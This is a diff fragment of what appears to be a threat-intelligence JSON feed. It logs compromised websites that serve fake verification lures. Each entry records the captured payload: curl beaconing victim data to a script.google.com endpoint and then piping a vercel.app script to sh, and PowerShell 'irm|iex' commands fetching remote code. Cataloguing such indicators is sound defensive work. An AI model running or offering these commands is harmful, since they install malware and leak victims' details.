-    "ReportId": "cmwis04i2136r0omlg7ocdbh4",
-    "ScannedAt": "2026-11-16T04:41:10.897000+00:00"
-  },
-  {
-    "UrlDomain": "www.thebeatofibiza.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "2fwww.thebeatofibiza.com"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "52.30.247.6"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=7548974b-6da6-4fd0-ae79-b062e0be1fb7&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]thebeatofibiza[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A35%3A23.343Z&lastShellAt=2026-11-16T04%3A35%3A23.343Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwiruhff133n0oml0kfrpkfo",
-    "ScannedAt": "2026-11-16T04:36:47.663000+00:00"
-  },
-  {
-    "UrlDomain": "archer.lt",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.83.76"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/c5621fb7f3b4133b",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29913394",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/c5621fb7f3b4133b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/c5621fb7f3b4133b"
-    ],
-    "ReportId": "cmwirsm3n13250omlihq1z8fl",
-    "ScannedAt": "2026-11-16T04:35:20.446000+00:00"
-  },
-  {
-    "UrlDomain": "fitplus.rf.gd",
-    "DeliveryUrl": [
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/crabs/6414f8e8174928f0"
-    ],
-    "IP": [
-      "185.27.134.57"
-    ],
-    "Related": [
-      {
-        "Value": "b",
-        "Type": "Hostname"
-      },
-      {
-        "Value": "x",
-        "Type": "Hostname"
-      },
-      {
-        "Value": "a",
-        "Type": "Hostname"
-      }
-    ],
-    "Payload": "iex(irm 'https://cosmical2049[.]com/crabs/6414f8e8174928f0' -UserAgent 'WUA/39587ecfe2' -Headers @{'X-WUA'='39587ecfe2'})",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/crabs/6414f8e8174928f0"
-    ],
-    "ReportId": "cmwirqa5812v00omlaqvzahy1",
-    "ScannedAt": "2026-11-16T04:33:31.622000+00:00"
-  },
-  {
-    "UrlDomain": "adwysdclothings.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "172.67.203.135"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/5e2e8270c24f6abc",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/5e2e8270c24f6abc'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/5e2e8270c24f6abc"
-    ],
-    "ReportId": "cmwirpftl12sp0oml5j1f82n3",
-    "ScannedAt": "2026-11-16T04:32:52.387000+00:00"
   }
 ]
